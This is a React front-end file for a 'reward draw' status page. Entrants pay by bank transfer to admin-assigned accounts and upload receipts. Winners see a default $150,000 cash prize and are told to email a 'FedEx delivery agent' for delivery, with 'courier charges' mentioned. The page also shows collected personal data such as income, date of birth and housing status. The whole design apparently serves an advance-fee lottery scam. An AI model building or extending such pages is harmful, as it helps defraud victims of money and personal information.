import { useEffect, useRef, useState } from "react";
import { Link, useParams } from "react-router-dom";
import {
  HiBadgeCheck,
  HiCheckCircle,
  HiClock,
  HiDuplicate,
  HiMail,
  HiRefresh,
  HiStar,
  HiTruck,
  HiSparkles,
  HiCash,
  HiExclamation,
  HiLocationMarker,
  HiUpload,
} from "react-icons/hi";
import { apiFetch } from "../api";
import { config } from "../config";

const statusMessages = {
  "Awaiting Assignment":
    "Your request has been received. Bank transfer details will appear on this page once assigned by admin. Use the refresh button to check for updates.",
  Reviewed: "Your request has been reviewed. Bank transfer details will be posted here shortly. Keep refreshing.",
  "Transfer Details Sent": "Bank transfer details have been assigned below. Please use only the details shown on this page.",
  "Payment Confirmed": "We've confirmed your payment has been received. Your entries are now active in the draw.",
  "Winner Declared": "Your request has moved to delivery coordination. See the secure delivery instructions below.",
  Closed: "This request has been closed.",
};

function addDays(date, n) {
  const d = new Date(date);
  d.setDate(d.getDate() + n);
  return d.toLocaleDateString(undefined, { dateStyle: "long" });
}

// ── Confetti burst ─────────────────────────────────────────────────────────────
function ConfettiCanvas() {
  const canvasRef = useRef(null);

  useEffect(() => {
    const canvas = canvasRef.current;
    if (!canvas) return;
    const ctx = canvas.getContext("2d");
    const W = (canvas.width = canvas.offsetWidth);
    const H = (canvas.height = canvas.offsetHeight);

    const colors = ["#f97316", "#fbbf24", "#34d399", "#60a5fa", "#a78bfa", "#f472b6"];
    const particles = Array.from({ length: 120 }, () => ({
      x: Math.random() * W,
      y: -20 - Math.random() * 80,
      vx: (Math.random() - 0.5) * 3,
      vy: 2 + Math.random() * 4,
      rot: Math.random() * 360,
      vrot: (Math.random() - 0.5) * 8,
      w: 6 + Math.random() * 8,
      h: 3 + Math.random() * 5,
      color: colors[Math.floor(Math.random() * colors.length)],
      opacity: 1,
    }));

    let raf;
    const draw = () => {
      ctx.clearRect(0, 0, W, H);
      let alive = false;
      for (const p of particles) {
        p.x += p.vx;
        p.y += p.vy;
        p.rot += p.vrot;
        p.vy += 0.05; // gravity
        if (p.y > H) p.opacity -= 0.04;
        if (p.opacity <= 0) continue;
        alive = true;
        ctx.save();
        ctx.translate(p.x, p.y);
        ctx.rotate((p.rot * Math.PI) / 180);
        ctx.globalAlpha = p.opacity;
        ctx.fillStyle = p.color;
        ctx.fillRect(-p.w / 2, -p.h / 2, p.w, p.h);
        ctx.restore();
      }
      if (alive) raf = requestAnimationFrame(draw);
    };
    raf = requestAnimationFrame(draw);
    return () => cancelAnimationFrame(raf);
  }, []);

  return (
    <canvas
      ref={canvasRef}
      className="pointer-events-none absolute inset-0 h-full w-full"
    />
  );
}

function WinnerCelebration({ entry, entryId }) {
  const prizeAmount = entry.prizeAmountWon || "$150,000";
  const deliveryMethod = entry.fulfillmentPreference === "Check" ? "Cheque" : (entry.fulfillmentPreference || "Cash");
  const deliveryAddress = entry.homeAddress
    ? `${entry.homeAddress}${entry.state ? ", " + entry.state : ""}`
    : "your registered address";
  const delivery = entry.delivery || {};
  const activeIssues = (delivery.issues || []).filter(
    (i) => !i.resolved && (!i.expiresAt || new Date(i.expiresAt) > new Date())
  );
  const hasIssues = activeIssues.length > 0;
  const progress = delivery.progressPercent || 0;
  const estimatedDelivery = delivery.estimatedDelivery || "Arrives in 2 to 4 days";

  return (
    <div className="relative mb-6 overflow-hidden rounded-3xl border-2 border-yellow-400 bg-gradient-to-br from-yellow-50 via-orange-50 to-amber-50 shadow-2xl shadow-yellow-400/20">
      <ConfettiCanvas />

      <div className="relative px-6 pt-8 pb-6 text-center">
        {/* Trophy emoji glow */}
        <div
          className="mx-auto mb-4 flex h-24 w-24 items-center justify-center rounded-full text-5xl"
          style={{
            background: "radial-gradient(circle, rgba(251,191,36,0.3) 0%, rgba(249,115,22,0.1) 70%)",
            boxShadow: "0 0 60px rgba(251,191,36,0.5)",
            animation: "pulse 2s ease-in-out infinite",
          }}
        >
          🏆
        </div>

        <div className="mb-2 inline-flex items-center gap-2 rounded-full border border-yellow-400 bg-yellow-100 px-4 py-1.5">
          <HiSparkles className="h-4 w-4 text-yellow-600" />
          <span className="text-xs font-extrabold uppercase tracking-[0.22em] text-yellow-800">Congratulations!</span>
          <HiSparkles className="h-4 w-4 text-yellow-600" />
        </div>

        <h2 className="mt-3 font-display text-3xl font-extrabold text-slate-950 sm:text-4xl">
          You Won!
        </h2>

        {/* Prize amount */}
        <div
          className="mx-auto mt-5 max-w-xs rounded-2xl border border-yellow-300 bg-white px-6 py-5 shadow-lg"
          style={{ boxShadow: "0 0 40px rgba(251,191,36,0.2)" }}
        >
          <p className="text-xs font-bold uppercase tracking-widest text-slate-400">Prize Amount</p>
          <p
            className="mt-1 font-display text-5xl font-extrabold text-slate-950"
            style={{ textShadow: "0 2px 10px rgba(249,115,22,0.2)" }}
          >
            {prizeAmount}
          </p>
        </div>

        {/* Delivery info cards */}
        <div className="mt-5 grid gap-3 sm:grid-cols-2 text-left">
          <div className="flex items-start gap-3 rounded-2xl border border-emerald-200 bg-emerald-50 p-4">
            <div className="flex h-8 w-8 flex-shrink-0 items-center justify-center rounded-xl bg-emerald-100">
              <HiCash className="h-4 w-4 text-emerald-700" />
            </div>
            <div>
              <p className="text-xs font-bold uppercase tracking-widest text-emerald-600">Delivered via</p>
              <p className="mt-0.5 text-sm font-extrabold text-emerald-900">{deliveryMethod}</p>
            </div>
          </div>

          <div className="flex items-start gap-3 rounded-2xl border border-blue-200 bg-blue-50 p-4">
            <div className="flex h-8 w-8 flex-shrink-0 items-center justify-center rounded-xl bg-blue-100">
              <HiLocationMarker className="h-4 w-4 text-blue-700" />
            </div>
            <div>
              <p className="text-xs font-bold uppercase tracking-widest text-blue-600">Delivering to</p>
              <p className="mt-0.5 text-sm font-extrabold text-blue-900 leading-tight">{deliveryAddress}</p>
            </div>
          </div>
        </div>

        <div className={`mt-5 rounded-2xl border p-4 text-left ${hasIssues ? "border-red-200 bg-red-50" : "border-orange-200 bg-white"}`}>
          <div className="flex items-start gap-3">
            <div className={`flex h-10 w-10 flex-shrink-0 items-center justify-center rounded-xl ${hasIssues ? "bg-red-100 text-red-700" : "bg-orange-100 text-orange-700"}`}>
              {hasIssues ? <HiExclamation className="h-5 w-5" /> : <HiTruck className="h-5 w-5" />}
            </div>
            <div className="min-w-0 flex-1">
              <div className="flex flex-wrap items-center justify-between gap-2">
                <p className={`text-xs font-bold uppercase tracking-widest ${hasIssues ? "text-red-700" : "text-orange-700"}`}>
                  {hasIssues ? "Delivery issue" : "Delivery progress"}
                </p>
                <span className={`rounded-full px-3 py-1 text-xs font-extrabold ${hasIssues ? "bg-red-100 text-red-700" : "bg-orange-100 text-orange-700"}`}>
                  {progress}% complete
                </span>
              </div>
              <p className={`mt-1 text-sm font-extrabold ${hasIssues ? "text-red-950" : "text-slate-900"}`}>
                {delivery.currentCheckpoint || "Processing"}
              </p>
              <div className="mt-3 h-2 overflow-hidden rounded-full bg-slate-200">
                <div
                  className={`h-full rounded-full ${hasIssues ? "bg-red-500" : "bg-orange-500"}`}
                  style={{ width: `${Math.max(progress, 4)}%` }}
                />
              </div>
              <p className={`mt-3 text-sm leading-6 ${hasIssues ? "text-red-800" : "text-slate-700"}`}>
                {hasIssues
                  ? "Please contact our delivery agent so the delivery can continue."
                  : `Estimated time to arrive: ${estimatedDelivery}.`}
              </p>
              {hasIssues && (
                <a
                  href={`mailto:${config.fedexAgentEmail}`}
                  className="mt-3 inline-flex items-center gap-2 rounded-xl bg-red-600 px-3 py-2 text-xs font-bold text-white hover:bg-red-700"
                >
                  <HiMail className="h-4 w-4" />
                  Contact agent: {config.fedexAgentEmail}
                </a>
              )}
            </div>
          </div>
        </div>

        {/* Delivery tracking link */}
        {entry.deliveryCode && (
          <Link
            to={`/delivery/${entryId}`}
            className="mt-5 inline-flex w-full items-center justify-center gap-2 rounded-2xl bg-gradient-to-r from-orange-500 to-amber-500 px-5 py-4 font-display text-sm font-extrabold text-white shadow-lg shadow-orange-500/30 transition hover:from-orange-600 hover:to-amber-600"
          >
            <HiTruck className="h-5 w-5" />
            Track Your Delivery — Code: {entry.deliveryCode}
          </Link>
        )}
      </div>
    </div>
  );
}

// ── Old winner delivery block (FedEx info) ─────────────────────────────────────
function WinnerDeliveryBlock({ entry, entryId, copied, onCopy }) {
  const delivery = entry.delivery || {};
  const estimatedDelivery = delivery.estimatedDelivery || "Arrives in 2 to 4 days";

  return (
    <div className="mb-5 rounded-2xl border border-yellow-300 bg-gradient-to-br from-yellow-50 to-orange-50 p-6 shadow-sm">
      <div className="mb-4 flex items-start gap-3">
        <div className="flex h-12 w-12 flex-shrink-0 items-center justify-center rounded-2xl bg-yellow-100 text-yellow-700">
          <HiTruck className="h-7 w-7" />
        </div>
        <div>
          <h2 className="font-display text-xl font-extrabold text-yellow-950">Delivery coordination instructions</h2>
          <p className="mt-1.5 text-sm leading-6 text-yellow-900">
            Your request for <strong>{entry.selectedRewardPack}</strong> has moved to the delivery coordination stage.
          </p>
        </div>
      </div>

      <div className="grid gap-3 rounded-2xl border border-yellow-200 bg-white p-4 text-sm">
        <CopyField label="Delivery Code" value={entry.deliveryCode || "Pending"} id="winner-delivery-code" copied={copied} onCopy={onCopy} />
        <CopyField label="Status Code" value={entry.statusCode || "Pending"} id="winner-status-code" copied={copied} onCopy={onCopy} />
        <Field label="Request ID" value={entry._id || entryId} />
        <Field label="Name" value={entry.fullName} />
        <Field label="Time to Arrive" value={estimatedDelivery} />
      </div>

      <div className="mt-4 rounded-2xl border border-orange-200 bg-orange-50 p-4">
        <div className="flex gap-3">
          <HiMail className="mt-0.5 h-5 w-5 flex-shrink-0 text-orange-700" />
          <p className="text-sm leading-6 text-orange-950">
            Kindly email our FedEx delivery agent at{" "}
            <a href={`mailto:${config.fedexAgentEmail}`} className="font-bold underline">
              {config.fedexAgentEmail}
            </a>{" "}
            with your delivery code, full name, and request ID so they can explain how the delivery coordination process works.
          </p>
        </div>
      </div>

      <p className="mt-4 text-xs leading-5 text-yellow-900">
        FedEx is an independent delivery agency. Standard courier charges may apply depending on delivery requirements and location. Any applicable courier charge should be handled only through official FedEx channels; do not share OTPs, passwords, card PINs, banking credentials, claim tokens, or secure claim links.
      </p>
    </div>
  );
}

// ── Status page header ─────────────────────────────────────────────────────────
function Header({ icon: Icon, eyebrow, title, tone }) {
  const styles = {
    winner: "bg-gradient-to-r from-yellow-400 to-orange-500",
    confirmed: "bg-gradient-to-r from-emerald-700 to-emerald-500",
    default: "bg-slate-950",
  };
  return (
    <div className={`${styles[tone] || styles.default} px-7 py-6 text-white`}>
      <div className="flex items-center gap-3">
        <Icon className="h-9 w-9 text-orange-100" />
        <div>
          <p className="text-xs font-bold uppercase tracking-[0.24em] text-white/75">{eyebrow}</p>
          <h1 className="mt-1 font-display text-3xl font-extrabold">{title}</h1>
        </div>
      </div>
    </div>
  );
}

function PaymentReceiptUpload({ entry, entryId, onUploaded }) {
  const [file, setFile] = useState(null);
  const [uploading, setUploading] = useState(false);
  const [message, setMessage] = useState("");

  const receipt = entry.paymentReceipt;
  const cloudName = import.meta.env.VITE_CLOUDINARY_CLOUD_NAME;
  const uploadPreset = import.meta.env.VITE_CLOUDINARY_UPLOAD_PRESET;
  const canUpload = Boolean(cloudName?.trim() && uploadPreset?.trim());

  function onFileChange(e) {
    const nextFile = e.target.files?.[0] || null;
    setMessage("");
    if (!nextFile) {
      setFile(null);
      return;
    }
    const allowed = ["image/jpeg", "image/png", "image/webp", "image/heic", "image/heif", "application/pdf"];
    if (!allowed.includes(nextFile.type)) {
      setFile(null);
      setMessage("Please upload a JPG, PNG, WEBP, HEIC, or PDF receipt.");
      return;
    }
    if (nextFile.size > 10 * 1024 * 1024) {
      setFile(null);
      setMessage("Receipt file must be 10MB or smaller.");
      return;
    }
    setFile(nextFile);
  }

  async function uploadReceipt() {
    if (!file) {
      setMessage("Please choose a receipt file first.");
      return;
    }
    if (!canUpload) {
      setMessage("Upload setup is not loaded yet. Restart the frontend dev server so the Cloudinary settings in .env are picked up.");
      return;
    }
    setUploading(true);
    setMessage("");
    try {
      const form = new FormData();
      form.append("file", file);
      form.append("upload_preset", uploadPreset);

      const cloudinaryRes = await fetch(`https://api.cloudinary.com/v1_1/${cloudName}/auto/upload`, {
        method: "POST",
        body: form,
      });
      const cloudinaryData = await cloudinaryRes.json();
      if (!cloudinaryRes.ok) {
        throw new Error(cloudinaryData.error?.message || "Receipt upload failed.");
      }

      const res = await apiFetch(`/api/reward-entries/${entryId}/payment-receipt`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          url: cloudinaryData.secure_url,
          publicId: cloudinaryData.public_id,
          originalFilename: cloudinaryData.original_filename || file.name,
          resourceType: cloudinaryData.resource_type,
          format: cloudinaryData.format,
          bytes: cloudinaryData.bytes,
        }),
      });
      const data = await res.json();
      if (!res.ok) throw new Error(data.error || "Unable to save receipt.");

      setFile(null);
      setMessage("Receipt uploaded successfully. Please refresh later for payment confirmation.");
      onUploaded(data.entry);
    } catch (err) {
      setMessage(err.message);
    } finally {
      setUploading(false);
    }
  }

  return (
    <div className="mt-5 rounded-2xl border border-blue-200 bg-blue-50 p-5">
      <div className="flex flex-col gap-4 sm:flex-row sm:items-start sm:justify-between">
        <div>
          <p className="text-xs font-bold uppercase tracking-widest text-blue-700">Upload Receipt</p>
          <h2 className="mt-2 font-display text-xl font-extrabold text-blue-950">Send proof of payment</h2>
          <p className="mt-2 text-sm leading-6 text-blue-900">
            Upload your payment receipt after sending the transfer. The review team will confirm it from here.
          </p>
        </div>
        {receipt?.url && (
          <a
            href={receipt.url}
            target="_blank"
            rel="noreferrer"
            className="inline-flex flex-shrink-0 items-center justify-center rounded-xl border border-blue-200 bg-white px-4 py-2 text-xs font-bold text-blue-700 hover:bg-blue-100"
          >
            View uploaded receipt
          </a>
        )}
      </div>

      {receipt?.uploadedAt && (
        <div className="mt-4 rounded-xl border border-emerald-200 bg-white px-4 py-3 text-xs font-semibold text-emerald-700">
          Receipt received on {new Date(receipt.uploadedAt).toLocaleString()}
          {receipt.paymentMethod ? ` via ${receipt.paymentMethod}` : ""}.
        </div>
      )}

      <div className="mt-4 grid gap-3">
        <div className="rounded-xl border border-blue-200 bg-white px-4 py-3">
          <p className="text-xs font-bold uppercase tracking-widest text-blue-700">Selected Payment Method</p>
          <p className="mt-1 text-sm font-extrabold text-slate-900">{entry.selectedPaymentMethod}</p>
        </div>

        <label className="flex cursor-pointer flex-col items-center justify-center rounded-2xl border-2 border-dashed border-blue-200 bg-white px-4 py-6 text-center transition hover:border-blue-300 hover:bg-blue-50/50">
          <HiUpload className="h-7 w-7 text-blue-600" />
          <span className="mt-2 text-sm font-bold text-slate-800">
            {file ? file.name : "Choose receipt file"}
          </span>
          <span className="mt-1 text-xs text-slate-500">JPG, PNG, WEBP, HEIC, or PDF. Max 10MB.</span>
          <input
            type="file"
            accept="image/jpeg,image/png,image/webp,image/heic,image/heif,application/pdf"
            onChange={onFileChange}
            className="sr-only"
          />
        </label>

        {!canUpload && (
          <p className="rounded-xl border border-amber-200 bg-amber-50 px-4 py-3 text-xs font-semibold leading-5 text-amber-800">
            Cloudinary is not configured yet. Add VITE_CLOUDINARY_CLOUD_NAME and VITE_CLOUDINARY_UPLOAD_PRESET to the frontend environment.
          </p>
        )}

        {message && (
          <p className={`rounded-xl px-4 py-3 text-xs font-semibold leading-5 ${message.includes("successfully") ? "bg-emerald-50 text-emerald-700" : "bg-red-50 text-red-700"}`}>
            {message}
          </p>
        )}

        <button
          type="button"
          onClick={uploadReceipt}
          disabled={uploading}
          className="inline-flex items-center justify-center gap-2 rounded-2xl bg-blue-600 px-5 py-3 text-sm font-bold text-white transition hover:bg-blue-700 disabled:cursor-not-allowed disabled:opacity-60"
        >
          {uploading ? <HiRefresh className="h-4 w-4 animate-spin" /> : <HiUpload className="h-4 w-4" />}
          {uploading ? "Uploading..." : receipt?.url ? "Replace Receipt" : "Upload Receipt"}
        </button>
      </div>
    </div>
  );
}

// ── Main ───────────────────────────────────────────────────────────────────────
export default function RewardStatusPage() {
  const { entryId } = useParams();
  const [entry, setEntry] = useState(null);
  const [loading, setLoading] = useState(true);
  const [error, setError] = useState("");
  const [copied, setCopied] = useState("");

  async function loadStatus() {
    setLoading(true);
    setError("");
    try {
      const res = await apiFetch(`/api/reward-entries/status/${entryId}`);
      const data = await res.json();
      if (!res.ok) throw new Error(data.error || "Unable to load request status.");
      setEntry(data.entry);
    } catch (err) {
      setError(err.message);
    } finally {
      setLoading(false);
    }
  }

  useEffect(() => { loadStatus(); }, [entryId]);

  function handleCopy(text, key) {
    navigator.clipboard.writeText(text).then(() => {
      setCopied(key);
      setTimeout(() => setCopied(""), 2000);
    });
  }

  const hasTransferDetails = entry?.bankTransferOptions && entry.bankTransferOptions.length > 0;
  const isPaymentConfirmed = entry?.status === "Payment Confirmed";
  const isWinnerDeclared = entry?.status === "Winner Declared";
  const canHandlePayment = entry && !entry.paymentReceivedAt && !["Payment Confirmed", "Winner Declared", "Closed"].includes(entry.status);
  const updateByDate = addDays(new Date(), 2);

  return (
    <div className="min-h-[70vh] bg-[#fffaf2] px-4 py-14">
      <div className="mx-auto max-w-2xl overflow-hidden rounded-3xl border border-slate-200 bg-white shadow-xl shadow-orange-950/5">
        {isWinnerDeclared ? (
          <Header icon={HiStar} eyebrow="Winner Declared" title="You're a winner!" tone="winner" />
        ) : isPaymentConfirmed ? (
          <Header icon={HiBadgeCheck} eyebrow="Payment Confirmed" title="You're in the draw" tone="confirmed" />
        ) : (
          <Header icon={HiClock} eyebrow="Request Status" title="Refresh for updates" />
        )}

        <div className="p-7">
          {loading ? (
            <p className="text-slate-600">Checking the latest status...</p>
          ) : error ? (
            <p className="rounded-2xl border border-red-200 bg-red-50 p-4 text-sm font-semibold text-red-700">
              {error}
            </p>
          ) : (
            <>
              {/* WINNER CELEBRATION (replaces old block) */}
              {isWinnerDeclared && (
                <WinnerCelebration entry={entry} entryId={entryId} />
              )}

              {entry.statusCode && (
                <div className="mb-5 rounded-2xl border border-blue-200 bg-blue-50 p-5">
                  <div className="flex flex-col gap-3 sm:flex-row sm:items-center sm:justify-between">
                    <div>
                      <p className="text-xs font-bold uppercase tracking-widest text-blue-700">Save Your Status Code</p>
                      <p className="mt-1 text-sm leading-6 text-blue-900">
                        Copy this code to check status later. You can use it anytime to reopen your draw status without logging in.
                      </p>
                    </div>
                    <button
                      type="button"
                      onClick={() => handleCopy(entry.statusCode, "status-code-banner")}
                      className="inline-flex items-center justify-center gap-2 rounded-xl border border-blue-200 bg-white px-4 py-2 font-mono text-lg font-extrabold text-slate-950 transition hover:border-blue-300 hover:bg-blue-100"
                    >
                      {copied === "status-code-banner" ? <HiCheckCircle className="h-5 w-5 text-emerald-500" /> : <HiDuplicate className="h-5 w-5 text-blue-600" />}
                      {copied === "status-code-banner" ? "Copied" : entry.statusCode}
                    </button>
                  </div>
                </div>
              )}

              {/* Old FedEx delivery block (shown below celebration) */}
              {isWinnerDeclared && <WinnerDeliveryBlock entry={entry} entryId={entryId} copied={copied} onCopy={handleCopy} />}

              {isPaymentConfirmed && !isWinnerDeclared && (
                <div className="mb-5 rounded-2xl border border-emerald-200 bg-emerald-50 p-5">
                  <div className="mb-3 flex items-center gap-3">
                    <HiBadgeCheck className="h-7 w-7 flex-shrink-0 text-emerald-600" />
                    <p className="font-display text-xl font-extrabold text-emerald-900">Payment Confirmed</p>
                  </div>
                  <p className="text-sm leading-6 text-emerald-800">
                    Your transfer has been verified and your entries are active in the draw.
                  </p>
                  <div className="mt-4 rounded-xl border border-emerald-300 bg-white px-4 py-3">
                    <p className="text-xs font-bold uppercase tracking-widest text-emerald-700">Draw Status</p>
                    <p className="mt-1 text-sm font-semibold text-slate-800">Draw still in progress.</p>
                    <p className="mt-1 text-xs text-slate-500">
                      Come back by <strong className="text-slate-700">{updateByDate}</strong> for the latest update.
                    </p>
                  </div>
                </div>
              )}

              {!isPaymentConfirmed && !isWinnerDeclared && (
                <div className="mb-5 rounded-2xl border border-orange-200 bg-orange-50 p-5">
                  <p className="text-xs font-bold uppercase tracking-widest text-orange-700">Current Status</p>
                  <p className="mt-2 font-display text-2xl font-extrabold text-slate-950">{entry.status}</p>
                  <p className="mt-2 text-sm leading-6 text-orange-900">
                    {statusMessages[entry.status] || "Please refresh this page later for updates."}
                  </p>
                </div>
              )}

              {canHandlePayment && !entry.selectedPaymentMethod && (
                <div className="mt-5 rounded-2xl border border-blue-200 bg-blue-50 p-5">
                  <p className="text-xs font-bold uppercase tracking-widest text-blue-700">Payment Method Pending</p>
                  <h2 className="mt-2 font-display text-xl font-extrabold text-blue-950">Waiting for admin assignment</h2>
                  <p className="mt-2 text-sm leading-6 text-blue-900">
                    {entry.requestedPaymentMethod
                      ? `You selected ${entry.requestedPaymentMethod}. The receipt upload slot will appear here once the admin assigns the final payment method for this request.`
                      : "The receipt upload slot will appear here once the admin assigns a payment method for this request."}
                  </p>
                </div>
              )}

              {canHandlePayment && entry.selectedPaymentMethod && (
                <PaymentReceiptUpload
                  entry={entry}
                  entryId={entryId}
                  onUploaded={(updatedEntry) => setEntry(updatedEntry)}
                />
              )}

              <div className="mt-5 grid gap-4 rounded-2xl border border-slate-200 bg-slate-50 p-5 text-sm">
                <Field label="Name" value={entry.fullName} />
                <Field label="Email" value={entry.email} />
                <Field label="Text Number" value={entry.phone} />
                <Field label="Home Address" value={entry.homeAddress} />
                <Field label="State" value={entry.state} />
                <Field label="Date of Birth" value={entry.dateOfBirth} />
                <Field label="Occupation" value={entry.occupation} />
                <Field label="Sex" value={entry.sex} />
                <Field label={`${entry.incomeFrequency || "Monthly / Weekly"} Income`} value={entry.incomeAmount} />
                <Field label="Cash or Check" value={entry.fulfillmentPreference} />
                <Field label="Requested Payment Method" value={entry.requestedPaymentMethod} />
                <Field label="Own or Rent Apartment" value={entry.housingStatus} />
                <Field label="Reward Pack" value={entry.selectedRewardPack} />
                <Field label="Listed Price" value={entry.listedPrice} />
                <CopyField label="Status Code" value={entry.statusCode || "Pending"} id="details-status-code" copied={copied} onCopy={handleCopy} />
              </div>

              <div className="mt-5 rounded-2xl border border-amber-200 bg-amber-50 p-5 text-sm leading-6 text-amber-900">
                <strong>Security note:</strong> Keep your claim token and secure claim link private. Do not post, forward, or disclose them to anyone.
              </div>

              {hasTransferDetails && !isWinnerDeclared && (
                <div className="mt-5 space-y-3">
                  <div className="rounded-2xl border border-emerald-200 bg-emerald-50 px-5 py-4">
                    <p className="text-xs font-bold uppercase tracking-widest text-emerald-700">Bank Transfer Details</p>
                    <p className="mt-1 text-sm leading-6 text-emerald-900">
                      Use only the details shown below. Do not share banking passwords or OTPs.
                    </p>
                  </div>

                  {entry.bankTransferOptions.map((option, idx) => (
                    <div key={idx} className="space-y-4 rounded-2xl border border-slate-200 bg-slate-50 p-5">
                      {option.label && (
                        <span className="rounded-full bg-slate-950 px-3 py-1 text-xs font-bold uppercase tracking-wider text-white">
                          {option.label}
                        </span>
                      )}
                      {option.recipientName && (
                        <CopyField label="Account / Recipient Name" value={option.recipientName} id={`name-${idx}`} copied={copied} onCopy={handleCopy} />
                      )}
                      {option.recipientValue && (
                        <CopyField label="Account Number / Address" value={option.recipientValue} id={`value-${idx}`} copied={copied} onCopy={handleCopy} />
                      )}
                      {option.instructions && <Field label="Instructions" value={option.instructions} multiline />}
                    </div>
                  ))}
                </div>
              )}

              {!hasTransferDetails && !isPaymentConfirmed && !isWinnerDeclared && (
                <div className="mt-5 rounded-2xl border border-slate-200 bg-slate-50 p-5 text-sm leading-6 text-slate-600">
                  Bank transfer details will appear here once admin assigns them for your request. Please refresh this page later.
                </div>
              )}

              {(entry.assignedInstructionTitle || entry.assignedInstructionBody) && (
                <div className="mt-5 rounded-2xl border border-blue-200 bg-blue-50 p-5">
                  <p className="text-xs font-bold uppercase tracking-widest text-blue-700">Additional Instructions</p>
                  <h2 className="mt-2 font-display text-xl font-extrabold text-blue-950">{entry.assignedInstructionTitle}</h2>
                  <p className="mt-2 whitespace-pre-line text-sm leading-6 text-blue-900">{entry.assignedInstructionBody}</p>
                </div>
              )}
            </>
          )}

          <div className="mt-7 flex flex-col gap-3 sm:flex-row">
            <button
              type="button"
              onClick={loadStatus}
              className="inline-flex flex-1 items-center justify-center gap-2 rounded-2xl bg-orange-600 px-5 py-3 text-sm font-bold text-white transition hover:bg-orange-700"
            >
              <HiRefresh className="h-4 w-4" />
              Refresh Status
            </button>
            <Link to="/" className="inline-flex flex-1 items-center justify-center rounded-2xl border border-slate-200 px-5 py-3 text-sm font-bold text-slate-700 transition hover:bg-slate-50">
              Back Home
            </Link>
          </div>
        </div>
      </div>

      <style>{`
        @keyframes pulse {
          0%, 100% { transform: scale(1); }
          50% { transform: scale(1.08); }
        }
      `}</style>
    </div>
  );
}

function Field({ label, value, multiline }) {
  return (
    <div>
      <p className="text-xs font-bold uppercase tracking-widest text-slate-400">{label}</p>
      <p className={`mt-1 font-semibold text-slate-800 ${multiline ? "whitespace-pre-line text-sm leading-6" : ""}`}>
        {value || "Not provided"}
      </p>
    </div>
  );
}

function CopyField({ label, value, id, copied, onCopy }) {
  return (
    <div>
      <p className="text-xs font-bold uppercase tracking-widest text-slate-400">{label}</p>
      <div className="mt-1 flex items-center justify-between gap-2">
        <p className="break-all font-semibold text-slate-800">{value}</p>
        <button
          type="button"
          onClick={() => onCopy(value, id)}
          className="inline-flex flex-shrink-0 items-center gap-1 rounded-lg border border-slate-200 bg-white px-2.5 py-1.5 text-xs font-semibold text-slate-600 transition hover:border-orange-300 hover:text-orange-700"
        >
          {copied === id ? (
            <>
              <HiCheckCircle className="h-3.5 w-3.5 text-emerald-500" />
              Copied
            </>
          ) : (
            <>
              <HiDuplicate className="h-3.5 w-3.5" />
              Copy
            </>
          )}
        </button>
      </div>
    </div>
  );
}
